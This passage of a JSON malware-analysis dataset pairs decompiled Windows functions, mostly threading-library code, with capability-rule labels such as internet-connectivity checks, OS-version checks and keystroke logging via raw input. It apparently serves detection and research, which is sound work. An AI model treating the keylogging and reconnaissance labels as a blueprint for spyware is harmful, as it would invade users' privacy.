        "decompiled_code": "\nulong fcn.140011b80(int32_t **arg1, int64_t arg2)\n\n{\n    uint64_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int32_t *arg2_00;\n    ulong uVar7;\n    uint64_t uVar8;\n    \n    uVar8 = 0xffffffff;\n    if (arg2 != 0) {\n        uVar5 = fcn.140011790(arg2);\n        uVar8 = 0;\n        uVar6 = fcn.140011740();\n        if (uVar6 < uVar5) {\n            uVar8 = 0xffffffff;\n            if (uVar5 - uVar6 < 0x100000000) {\n                uVar8 = uVar5 - uVar6;\n            }\n            arg2_00 = *arg1;\n            goto joined_r0x000140011bbc;\n        }\n    }\n    arg2_00 = *arg1;\njoined_r0x000140011bbc:\n    if (arg2_00 + 3U < 4) {\n        arg2_00 = fcn.1400119a0(arg1, arg2_00);\n    }\n    if (arg2_00 == NULL) {\n        return 0xc;\n    }\n    iVar3 = *arg2_00;\n    *arg2_00 = 1;\n    if (iVar3 != 0) {\n        if ((arg2_00[1] != 0) &&\n           (iVar2 = arg2_00[5],  iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)(),  iVar2 == iVar4)) {\n            LOCK();\n            if (*arg2_00 == 1) {\n                *arg2_00 = iVar3;\n            }\n            if (arg2_00[1] != 2) {\n                return 0x24;\n            }\n            arg2_00[4] = arg2_00[4] + 1;\n            return 0;\n        }\n        if (*(arg2_00 + 2) == 0) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n            if (uVar5 == 0) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar3 == 5) {\n                    return 1;\n                }\n                return 0xc;\n            }\n            LOCK();\n            puVar1 = arg2_00 + 2;\n            uVar6 = *puVar1;\n            *puVar1 = *puVar1 ^ (uVar6 == 0) * (*puVar1 ^ uVar5);\n            if (uVar6 != 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            }\n        }\n        while (iVar3 = *arg2_00,  *arg2_00 = 2,  iVar3 != 0) {\n            iVar3 = fcn.140011850(*(arg2_00 + 2), uVar8 & 0xffffffff);\n            if (iVar3 != 0) {\n                uVar7 = 0x16;\n                if (iVar3 == 0x102) {\n                    uVar7 = 0x8a;\n                }\n                return uVar7;\n            }\n        }\n    }\n    if (arg2_00[1] != 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        arg2_00[5] = iVar3;\n    }\n    return 0;\n}\n",
        "token_count": 807
    },
    "140011ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.140011ec0(int64_t *arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    \n    if (arg2 == NULL) {\n        iVar2 = -1;\n    }\n    else {\n        if ((*arg2 & 4) != 0) {\n            return 0x28;\n        }\n        uVar1 = *arg2 & 3;\n        iVar2 = -2;\n        if (uVar1 != 1) {\n            iVar2 = (uVar1 != 2) * 2 + -3;\n        }\n    }\n    *arg1 = iVar2;\n    return 0;\n}\n",
        "token_count": 151
    },
    "14001208": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.140012080(int32_t **arg1, int32_t **arg2)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong arg1_00;\n    int32_t iVar5;\n    \n    piVar2 = *0x1400d7110;\n    iVar4 = **0x1400d7110;\n    *arg2 = NULL;\n    if (iVar4 == 0) {\n        iVar3 = fcn.1400113f0();\n        iVar4 = *piVar2;\n        if (*(iVar3 + 0xa0) == 0) goto code_r0x0001400120b7;\n        if (iVar4 == 0) {\n            iVar4 = fcn.1400113f0();\n        }\ncode_r0x000140012150:\n        fcn.1400132a0(*(iVar4 + 0xa0));\n        if (arg1 != NULL) goto code_r0x0001400120d3;\ncode_r0x000140012165:\n        iVar4 = *piVar2;\n        iVar5 = 0x16;\n        if (iVar4 != 0) goto code_r0x0001400120ff;\ncode_r0x000140012178:\n        iVar3 = fcn.1400113f0();\n        iVar4 = *piVar2;\n        if (*(iVar3 + 0xa0) == 0) {\ncode_r0x0001400121a0:\n            arg1_00 = 0x14001b0d8;\n            *(iVar4 + 0xa0) = 0x14001b0d8;\n            goto code_r0x000140012114;\n        }\n        if (iVar4 == 0) {\n            iVar4 = fcn.1400113f0();\n        }\n    }\n    else {\n        if (*(iVar4 + 0xa0) != 0) goto code_r0x000140012150;\ncode_r0x0001400120b7:\n        *(iVar4 + 0xa0) = 0x14001b0d8;\n        fcn.1400132a0(0x14001b0d8);\n        if (arg1 == NULL) goto code_r0x000140012165;\ncode_r0x0001400120d3:\n        piVar1 = *arg1;\n        iVar5 = 0x16;\n        if (piVar1 != NULL) {\n            if (piVar1 == 0xffffffffffffffff) {\n                *arg1 = NULL;\n                iVar5 = 0;\n            }\n            else if (*piVar1 == -0x454e0f13) {\n                iVar5 = piVar1[1];\n                if (iVar5 == 0) {\n                    *arg2 = piVar1;\n                    *arg1 = NULL;\n                }\n                else {\n                    iVar5 = 0x10;\n                }\n            }\n        }\n        iVar4 = *piVar2;\n        if (iVar4 == 0) goto code_r0x000140012178;\ncode_r0x0001400120ff:\n        if (*(iVar4 + 0xa0) == 0) goto code_r0x0001400121a0;\n    }\n    arg1_00 = *(iVar4 + 0xa0);\ncode_r0x000140012114:\n    fcn.1400132e0(arg1_00);\n    return iVar5;\n}\n",
        "token_count": 769
    },
    "1400121f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1400121f0(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong arg1_00;\n    ulong uVar5;\n    \n    piVar2 = *0x1400d7110;\n    iVar4 = **0x1400d7110;\n    if (iVar4 == 0) {\n        iVar3 = fcn.1400113f0();\n        iVar4 = *piVar2;\n        if (*(iVar3 + 0xa0) == 0) goto code_r0x00014001221c;\n        if (iVar4 == 0) {\n            iVar4 = fcn.1400113f0();\n        }\ncode_r0x0001400122b0:\n        fcn.1400132a0(*(iVar4 + 0xa0));\n        if (arg1 != NULL) goto code_r0x000140012238;\ncode_r0x0001400122c5:\n        iVar4 = *piVar2;\n        uVar5 = 0x16;\n        if (iVar4 != 0) goto code_r0x000140012269;\ncode_r0x0001400122d8:\n        iVar3 = fcn.1400113f0();\n        iVar4 = *piVar2;\n        if (*(iVar3 + 0xa0) == 0) {\ncode_r0x000140012300:\n            arg1_00 = 0x14001b0d8;\n            *(iVar4 + 0xa0) = 0x14001b0d8;\n            goto code_r0x00014001227e;\n        }\n        if (iVar4 == 0) {\n            iVar4 = fcn.1400113f0();\n        }\n    }\n    else {\n        if (*(iVar4 + 0xa0) != 0) goto code_r0x0001400122b0;\ncode_r0x00014001221c:\n        *(iVar4 + 0xa0) = 0x14001b0d8;\n        fcn.1400132a0(0x14001b0d8);\n        if (arg1 == NULL) goto code_r0x0001400122c5;\ncode_r0x000140012238:\n        piVar1 = *arg1;\n        uVar5 = 0x16;\n        if (((piVar1 != NULL) && (*piVar1 == -0x454e0f13)) && (uVar5 = 1,  piVar1 != 0xffffffffffffffff)) {\n            piVar1[1] = piVar1[1] + 1;\n            uVar5 = 0;\n        }\n        iVar4 = *piVar2;\n        if (iVar4 == 0) goto code_r0x0001400122d8;\ncode_r0x000140012269:\n        if (*(iVar4 + 0xa0) == 0) goto code_r0x000140012300;\n    }\n    arg1_00 = *(iVar4 + 0xa0);\ncode_r0x00014001227e:\n    fcn.1400132e0(arg1_00);\n    return uVar5;\n}\n",
        "token_count": 718
    },
    "14001232": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.140012320(int32_t **arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *arg2_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    uint32_t uVar7;\n    \n    piVar1 = *0x1400d7110;\n    iVar5 = **0x1400d7110;\n    if (iVar5 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar5 = *piVar1;\n        if (*(iVar4 + 0xa0) == 0) goto code_r0x00014001234b;\n        if (iVar5 == 0) {\n            iVar5 = fcn.1400113f0();\n        }\ncode_r0x0001400123d8:\n        uVar6 = *(iVar5 + 0xa0);\n    }\n    else {\n        if (*(iVar5 + 0xa0) != 0) goto code_r0x0001400123d8;\ncode_r0x00014001234b:\n        uVar6 = 0x14001b0d8;\n        *(iVar5 + 0xa0) = 0x14001b0d8;\n    }\n    fcn.1400132a0(uVar6);\n    if ((**arg1 != -0x454e0f13) || ((*arg1)[1] < 1)) {\n        uVar6 = (**0x14001b130)(2);\n        sub.msvcrt.dll_fprintf\n                  (uVar6, \"Assertion failed: (%s), file %s, line %d\\n\", \n                   \"(((rwlock_t *)*rwl)->valid == LIFE_RWLOCK) && (((rwlock_t *)*rwl)->busy > 0)\", \n                   \"C:/crossdev/src/mingw-w64-v8-git/mingw-w64-libraries/winpthreads/src/rwlock.c\", 0x2e);\n        iVar5 = 1;\n        sub.msvcrt.dll_exit();\n        *(iVar5 + 0xc) = -*(iVar5 + 0x10);\n        *(iVar5 + 0x10) = 0;\n        fcn.140011d40(iVar5 + 0x20);\n        arg2_00 = *(iVar5 + 0x18);\n        if (arg2_00 + 3U < 4) {\n            arg2_00 = fcn.1400119a0(iVar5 + 0x18, arg2_00);\n        }\n        if (arg2_00 == NULL) {\n            return 0xc;\n        }\n        if (arg2_00[1] != 0) {\n            if (*arg2_00 == 0) {\n                return 0x16;\n            }\n            iVar3 = arg2_00[5];\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar3 != iVar2) {\n                return 1;\n            }\n            if (arg2_00[4] != 0) {\n                arg2_00[4] = arg2_00[4] + -1;\n                return 0;\n            }\n            arg2_00[5] = -1;\n        }\n        iVar3 = *arg2_00;\n        *arg2_00 = 0;\n        uVar7 = 0;\n        if (iVar3 == 2) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(arg2_00 + 2));\n            uVar7 = iVar3 == 0;\n        }\n        return uVar7;\n    }\n    (*arg1)[1] = (*arg1)[1] + -1;\n    iVar5 = *piVar1;\n    if (iVar5 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar5 = *piVar1;\n        if (*(iVar4 + 0xa0) != 0) {\n            if (iVar5 == 0) {\n                iVar5 = fcn.1400113f0();\n            }\n            goto code_r0x000140012410;\n        }\n    }\n    else if (*(iVar5 + 0xa0) != 0) {\ncode_r0x000140012410:\n        uVar6 = *(iVar5 + 0xa0);\n        goto code_r0x0001400123a2;\n    }\n    uVar6 = 0x14001b0d8;\n    *(iVar5 + 0xa0) = 0x14001b0d8;\ncode_r0x0001400123a2:\n    fcn.1400132e0(uVar6);\n    return arg2;\n}\n",
        "token_count": 1058
    },
    "14001268": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.140012680(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    uint uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    \n    piVar1 = *0x1400d7110;\n    iVar4 = **0x1400d7110;\n    if (iVar4 == 0) {\n        iVar3 = fcn.1400113f0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0xa8) == 0) goto code_r0x0001400126a3;\n        if (iVar4 == 0) {\n            iVar4 = fcn.1400113f0();\n        }\ncode_r0x000140012718:\n        fcn.1400132a0(*(iVar4 + 0xa8));\n        iVar4 = *arg1;\n    }\n    else {\n        if (*(iVar4 + 0xa8) != 0) goto code_r0x000140012718;\ncode_r0x0001400126a3:\n        *(iVar4 + 0xa8) = 0x14001b0d0;\n        fcn.1400132a0(0x14001b0d0);\n        iVar4 = *arg1;\n    }\n    if (iVar4 == -1) {\n        uVar2 = fcn.140012580(arg1);\n        iVar4 = *piVar1;\n        if (iVar4 == 0) {\n            iVar3 = fcn.1400113f0();\n            iVar4 = *piVar1;\n            if (*(iVar3 + 0xa8) != 0) {\n                if (iVar4 == 0) {\n                    iVar4 = fcn.1400113f0();\n                }\n                goto code_r0x000140012790;\n            }\n        }\n        else if (*(iVar4 + 0xa8) != 0) {\ncode_r0x000140012790:\n            uVar5 = *(iVar4 + 0xa8);\n            goto code_r0x000140012758;\n        }\n        uVar5 = 0x14001b0d0;\n        *(iVar4 + 0xa8) = 0x14001b0d0;\ncode_r0x000140012758:\n        fcn.1400132e0(uVar5);\n        return uVar2;\n    }\n    iVar4 = *piVar1;\n    if (iVar4 == 0) {\n        iVar3 = fcn.1400113f0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0xa8) == 0) goto code_r0x0001400127b8;\n        if (iVar4 == 0) {\n            iVar4 = fcn.1400113f0();\n        }\n    }\n    else if (*(iVar4 + 0xa8) == 0) {\ncode_r0x0001400127b8:\n        uVar5 = 0x14001b0d0;\n        *(iVar4 + 0xa8) = 0x14001b0d0;\n        goto code_r0x0001400126de;\n    }\n    uVar5 = *(iVar4 + 0xa8);\ncode_r0x0001400126de:\n    fcn.1400132e0(uVar5);\n    return 0x16;\n}\n",
        "token_count": 747
    },
    "1400127f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.1400127f0(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    \n    if ((*arg1 == 0xffffffffffffffff) && (uVar3 = fcn.140012680(arg1),  (uVar3 & 0xffffffef) != 0)) {\n        return uVar3;\n    }\n    piVar2 = *0x1400d7110;\n    iVar5 = **0x1400d7110;\n    if (iVar5 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar5 = *piVar2;\n        if (*(iVar4 + 0xa0) != 0) {\n            if (iVar5 == 0) {\n                iVar5 = fcn.1400113f0();\n            }\n            goto code_r0x0001400128b0;\n        }\ncode_r0x000140012822:\n        uVar6 = 0x14001b0d8;\n        *(iVar5 + 0xa0) = 0x14001b0d8;\n    }\n    else {\n        if (*(iVar5 + 0xa0) == 0) goto code_r0x000140012822;\ncode_r0x0001400128b0:\n        uVar6 = *(iVar5 + 0xa0);\n    }\n    fcn.1400132a0(uVar6);\n    piVar1 = *arg1;\n    uVar3 = 0x16;\n    if ((piVar1 != NULL) && (*piVar1 == -0x454e0f13)) {\n        piVar1[1] = piVar1[1] + 1;\n        uVar3 = 0;\n    }\n    iVar5 = *piVar2;\n    if (iVar5 == 0) {\n        iVar4 = fcn.1400113f0();\n        iVar5 = *piVar2;\n        if (*(iVar4 + 0xa0) == 0) goto code_r0x0001400128c0;\n        if (iVar5 == 0) {\n            iVar5 = fcn.1400113f0();\n        }\n    }\n    else if (*(iVar5 + 0xa0) == 0) {\ncode_r0x0001400128c0:\n        uVar6 = 0x14001b0d8;\n        *(iVar5 + 0xa0) = 0x14001b0d8;\n        goto code_r0x000140012875;\n    }\n    uVar6 = *(iVar5 + 0xa0);\ncode_r0x000140012875:\n    fcn.1400132e0(uVar6);\n    return uVar3;\n}\n",
        "token_count": 634
    },
    "14001361": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.140013610(ulong *arg1, int32_t *arg2)\n\n{\n    code *pcVar1;\n    ulong *puVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    if (arg1 == NULL) {\n        return 0x16;\n    }\n    if ((arg2 == NULL) || (*arg2 != 1)) {\n        puVar2 = sub.msvcrt.dll_calloc(1, 0xb0);\n        pcVar1 = _sym.imp.KERNEL32.dll_CreateSemaphoreA;\n        if (puVar2 != NULL) {\n            *puVar2 = 0xc0deadbf;\n            puVar2[1] = 0;\n            *(puVar2 + 2) = 0;\n            uVar3 = (*pcVar1)(0, 0, 0x7fffffff, 0);\n            puVar2[0x14] = uVar3;\n            iVar4 = (*pcVar1)(0, 0, 0x7fffffff, 0);\n            puVar2[0x15] = iVar4;\n            pcVar1 = _sym.imp.KERNEL32.dll_InitializeCriticalSection;\n            if (puVar2[0x14] != 0) {\n                if (iVar4 != 0) {\n                    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(puVar2 + 3);\n                    (*pcVar1)(puVar2 + 0xe);\n                    (*pcVar1)(puVar2 + 8);\n                    *puVar2 = 0xc0bab1fd;\n                    *(puVar2 + 0xd) = 0;\n                    *(puVar2 + 0x13) = 1;\n                    *arg1 = puVar2;\n                    return 0;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                iVar4 = puVar2[0x15];\n            }\n            if (iVar4 != 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            sub.msvcrt.dll_free(puVar2);\n            *arg1 = 0;\n            return 0xb;\n        }\n        uVar3 = 0xc;\n    }\n    else {\n        uVar3 = 0x28;\n    }\n    return uVar3;\n}\n",
        "token_count": 504
    },
    "14001376": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.140013760(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    uint uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong arg1_00;\n    \n    piVar1 = *0x1400d7110;\n    iVar4 = **0x1400d7110;\n    if (iVar4 == 0) {\n        iVar3 = fcn.1400113f0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0xb0) != 0) {\n            if (iVar4 == 0) {\n                iVar4 = fcn.1400113f0();\n            }\n            goto code_r0x000140013840;\n        }\ncode_r0x00014001378d:\n        *(iVar4 + 0xb0) = 0x14001b0e0;\n        fcn.1400132a0(0x14001b0e0);\n        if (arg1 != NULL) goto code_r0x0001400137a9;\ncode_r0x000140013855:\n        uVar2 = 0x16;\n    }\n    else {\n        if (*(iVar4 + 0xb0) == 0) goto code_r0x00014001378d;\ncode_r0x000140013840:\n        fcn.1400132a0(*(iVar4 + 0xb0));\n        if (arg1 == NULL) goto code_r0x000140013855;\ncode_r0x0001400137a9:\n        uVar2 = 0;\n        if (*arg1 == -1) {\n            uVar2 = fcn.140013610(arg1, 0);\n        }\n    }\n    iVar4 = *piVar1;\n    if (iVar4 == 0) {\n        iVar3 = fcn.1400113f0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0xb0) != 0) {\n            if (iVar4 == 0) {\n                iVar4 = fcn.1400113f0();\n            }\n            goto code_r0x000140013810;\n        }\n    }\n    else if (*(iVar4 + 0xb0) != 0) {\ncode_r0x000140013810:\n        arg1_00 = *(iVar4 + 0xb0);\n        goto code_r0x0001400137d7;\n    }\n    arg1_00 = 0x14001b0e0;\n    *(iVar4 + 0xb0) = 0x14001b0e0;\ncode_r0x0001400137d7:\n    fcn.1400132e0(arg1_00);\n    return uVar2;\n}\n",
        "token_count": 603
    },
    "14001388": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint32_t fcn.140013880(ulong arg1, ulong arg2, uint64_t arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t arg2_00;\n    uint32_t uVar3;\n    uint64_t arg4;\n    bool bVar4;\n    ulong uStack56;\n    int64_t iStack48;\n    \n    arg4 = arg3 & 0xffffffff;\n    if (arg2 != 1) {\n        uStack56 = arg1;\n        iStack48 = fcn.14000f7b0();\n        if (iStack48 == 0) {\n            uVar1 = 0x14;\n            if (arg4 == -1) {\n                do {\n                    iVar2 = fcn.140011850(arg1, 0x28);\n                    if (iVar2 == 0x80) {\n                        iVar2 = fcn.14000faa0();\n                        if (iVar2 == 0) {\n                            iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(arg1, 0);\n                            return iVar2 != 0;\n                        }\n                        break;\n                    }\n                    if (iVar2 != 0x102) {\n                        if (iVar2 == 0) {\n                            return 0;\n                        }\n                        iVar2 = fcn.14000faa0();\n                        if (iVar2 == 0) {\n                            return 0x16;\n                        }\n                        break;\n                    }\n                    iVar2 = fcn.14000faa0();\n                } while (iVar2 == 0);\n                if (arg2 != 2) {\ncode_r0x000140013b39:\n                    fcn.14000fc70();\n                    return 0x16;\n                }\n            }\n            else {\n                do {\n                    uVar3 = arg4;\n                    arg2_00 = uVar1;\n                    if (uVar3 <= uVar1) {\n                        arg2_00 = arg4;\n                    }\n                    iVar2 = fcn.140011850(arg1, arg2_00);\n                    if (iVar2 == 0x80) {\n                        if (uVar3 <= uVar1) {\n                            uVar1 = 1;\ncode_r0x000140013b06:\n                            bVar4 = true;\n                            goto code_r0x000140013b0b;\n                        }\n                        iVar2 = fcn.14000faa0();\n                        uVar1 = 1;\n                        if (iVar2 != 0) {\n                            return 0x16;\n                        }\ncode_r0x000140013a43:\n                        bVar4 = uVar1 != 0;\ncode_r0x000140013b0b:\n                        if (arg2 == 2) {\n                            return uVar1;\n                        }\n                        if (bVar4) {\n                            fcn.14000fc70();\n                            return uVar1;\n                        }\n                        return uVar1;\n                    }\n                    if (iVar2 != 0x102) {\n                        if (iVar2 == 0) {\n                            uVar1 = 0;\n                        }\n                        else {\n                            if (uVar3 <= uVar1) {\n                                uVar1 = 0x16;\n                                goto code_r0x000140013b06;\n                            }\n                            iVar2 = fcn.14000faa0();\n                            if (iVar2 != 0) {\n                                return 0x16;\n                            }\n                            uVar1 = 0x16;\n                        }\n                        goto code_r0x000140013a43;\n                    }\n                    uVar3 = uVar3 - arg2_00;\n                    arg4 = uVar3;\n                    if (uVar3 == 0) {\n                        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(arg1, 0);\n                        if (iVar2 == 0) {\n                            return 0;\n                        }\n                        bVar4 = true;\n                        uVar1 = 0x8a;\n                        goto code_r0x000140013b0b;\n                    }\n                    iVar2 = fcn.14000faa0();\n                    uVar1 = arg2_00;\n                } while (iVar2 == 0);\n            }\n            return 0x16;\n        }\n        do {\n            uVar1 = fcn.1400118f0(2, &uStack56, 0, arg4);\n            if (uVar1 == 0x80) {\n                uVar3 = 1;\ncode_r0x000140013959:\n                iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uStack56, 0);\n                if (iVar2 == 0) {\n                    return 0;\n                }\njoined_r0x000140013ab9:\n                if (arg2 == 2) {\n                    return uVar3;\n                }\n                iVar2 = fcn.14000faa0();\n                if (iVar2 == 0) {\n                    return uVar3;\n                }\n                return 0x16;\n            }\n            if (0x80 < uVar1) {\n                uVar3 = 0x8a;\n                if (uVar1 == 0x102) goto code_r0x000140013959;\ncode_r0x000140013ab0:\n                uVar3 = 0x16;\n                goto joined_r0x000140013ab9;\n            }\n            if (uVar1 == 0) {\n                return 0;\n            }\n            if (uVar1 != 1) goto code_r0x000140013ab0;\n            (*_sym.imp.KERNEL32.dll_ResetEvent)(iStack48);\n            if (arg2 != 2) goto code_r0x000140013b39;\n            fcn.14000fc70();\n        } while( true );\n    }\n    iVar2 = fcn.140011850(arg1, arg3 & 0xffffffff);\n    if (iVar2 != 0x80) {\n        if (iVar2 != 0x102) {\n            arg2._0_4_ = 0x16;\n            goto joined_r0x000140013926;\n        }\n        arg2._0_4_ = 0x8a;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(arg1, 0);\njoined_r0x000140013926:\n    if (iVar2 == 0) {\n        return 0;\n    }\n    return arg2;\n}\n",
        "token_count": 1412
    },
    "140013c3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.140013c30(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t arg4;\n    int64_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    \n    piVar2 = *0x1400d7110;\n    if (arg1 == NULL) {\n        return 0x16;\n    }\n    iVar6 = *arg1;\n    if (iVar6 == 0) {\n        return 0x16;\n    }\n    if (iVar6 != -1) {\n        arg4 = iVar6 + 0x98;\n        iVar5 = iVar6 + 0x70;\n        iVar4 = fcn.140013b90(*(iVar6 + 0xa8), 0, 0xffffffff, iVar5);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        iVar1 = iVar6 + 0x18;\n        iVar4 = (*_sym.imp.KERNEL32.dll_TryEnterCriticalSection)(iVar1);\n        uVar7 = *(iVar6 + 0xa8);\n        if (iVar4 != 0) {\n            if (*(iVar6 + 8) == *(iVar6 + 0x10) || *(iVar6 + 8) < *(iVar6 + 0x10)) {\n                *arg1 = 0;\n                fcn.1400132f0(uVar7, 1, iVar5, arg4);\n                pcVar3 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(*(iVar6 + 0xa0));\n                (*pcVar3)(*(iVar6 + 0xa8));\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar1);\n                pcVar3 = _sym.imp.KERNEL32.dll_DeleteCriticalSection;\n                (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(iVar1);\n                (*pcVar3)(iVar5);\n                (*pcVar3)(iVar6 + 0x40);\n                sub.msvcrt.dll_free(iVar6);\n                return 0;\n            }\n            iVar4 = fcn.1400132f0(uVar7, 1, iVar5, arg4);\n            if (iVar4 == 0) {\n                iVar4 = 0x10;\n            }\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar1);\n            return iVar4;\n        }\n        fcn.1400132f0(uVar7, 1, iVar5, arg4);\n        return 0x10;\n    }\n    iVar6 = **0x1400d7110;\n    if (iVar6 == 0) {\n        iVar5 = fcn.1400113f0();\n        iVar6 = *piVar2;\n        if (*(iVar5 + 0xb0) == 0) goto code_r0x000140013d59;\n        if (iVar6 == 0) {\n            iVar6 = 